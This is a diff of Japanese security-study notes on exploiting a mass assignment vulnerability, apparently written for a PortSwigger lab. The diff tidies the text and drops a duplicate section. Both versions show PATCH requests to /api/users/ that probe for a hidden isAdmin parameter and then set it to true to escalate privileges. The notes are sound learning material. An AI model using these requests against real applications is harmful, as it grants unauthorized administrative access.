@@ -94,18 +94,18 @@
 
 3. `PATCH` または `POST` リクエストで、他のエンドポイントで使われているパラメータを試す
 
-正常な値でエラーが出ないか確認：
+正常な値でエラーが出ないか確認
 ```http
 PATCH /api/users/
 
 {
-    "username": "wiener",
-    "email": "wiener@example.com",
+    "username": "<username>",
+    "email": "<username>@<example.com>",
     "isAdmin": false
 }
 ```
 
-不正な値でエラーが出るか確認（エラーが出る = パラメータを受け付けている）：
+不正な値でエラーが出るか確認（エラーが出る = パラメータを受け付けている）
 ```http
 {
     "isAdmin": hogehoge
@@ -113,7 +113,6 @@ PATCH /api/users/
 ```
 
 4. パラメータの値を改変してリクエストし、PrivEscを完了する
-
 ```http
 PATCH /api/users/
 
@@ -124,76 +123,5 @@ PATCH /api/users/
 }
 ```
 
-🔗[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
-
----
----
-
----
-
-
-
----
-
-# Exploitation
-
-
-
----
-## Mass assignmentを利用したPrivEsc
-
-- Mass assignment = 隠しパラメタ or 他のエンドポイントへのリクエストに使用されるパラメタを使用して攻撃者の意図する値に変更されること
-
-1. あるAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
-```json
-{ 
-	"username": "wiener", 
-	"email": "wiener@example.com", 
-}
-```
-
-2. 同様に、他のAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
-```json
-{ 
-	"id": 123, 
-	"name": "John Doe", 
-	"email": "john@example.com", 
-	"isAdmin": "false" 
-}
-```
-
-3. `PATCH`メソッド or `POST`メソッドリクエストで、他のエンドポイントで使用されているパラメタを使ってみる
-
-- まずは正常な値を入力し、エラーが返らないか確認する
-```http
-PATCH /api/users/
-...
-
-{ 
-	"username": "wiener", 
-	"email": "wiener@example.com", 
-	"isAdmin": false, 
-}
-```
-
-- 次に、適当な値を入力し、エラーが返るか確認する。エラーが返る＝パラメタを正常に更新できている
-```http
-...
-	"isAdmin": hogehoge, 
-}
-```
-
-4. パラメタの値を改変しリクエスト。PrivEsc完了
-```http
-PATCH /api/users/
-...
-
-{ 
-	"username": "wiener", 
-	"email": "wiener@example.com", 
-	"isAdmin": true, 
-}
-```
-
-[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
+🔗[Web Security Academy Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
 
